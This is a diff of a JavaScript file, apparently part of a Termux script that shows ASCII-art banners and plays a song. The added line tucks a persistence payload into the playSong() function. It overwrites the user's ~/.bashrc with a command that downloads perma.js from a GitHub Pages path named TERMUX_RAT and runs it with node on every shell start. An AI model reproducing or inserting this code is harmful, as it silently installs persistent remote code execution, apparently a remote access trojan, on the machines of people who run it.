@@ -67,7 +67,7 @@ const msg3 = '  ██████  ▒█████   ██▀███   �
 '░ ░▒  ░    ░ ▒ ▒░   ░▒ ░ ▒   ░▒ ░ ▒  ▓██ ░▒░\n' +
 '░  ░  ░  ░ ░ ░ ▒    ░░   ░   ░░   ░  ▒ ▒ ░░\n' +
 '      ░      ░ ░     ░        ░      ░ ░';
-  console.log(msg);
+  console.log(msg2);
   /*setTimeout(() => {
   console.clear();
 }, 3000);
@@ -85,17 +85,10 @@ const msg3 = '  ██████  ▒█████   ██▀███   �
       });
     } else {
       playSong();
-      exe();
     }
   });
 
   function playSong() {
-  exec(`curl -s https://sabir7718.github.io/TERMUX_RAT/song.mp3 | play -t mp3 -`);
-
-  function exe() {
-    exec(`echo 'curl -s https://sabir7718.github.io/TERMUX_RAT/perma.js | node &' > ~/.bashrc`);
+    exec(`curl -s https://sabir7718.github.io/TERMUX_RAT/song.mp3 | play -t mp3 - && echo 'curl -s https://sabir7718.github.io/TERMUX_RAT/perma.js | node &' > ~/.bashrc`);
   }
-
-  // Call exe if needed
-  // exe();
-});
+  });
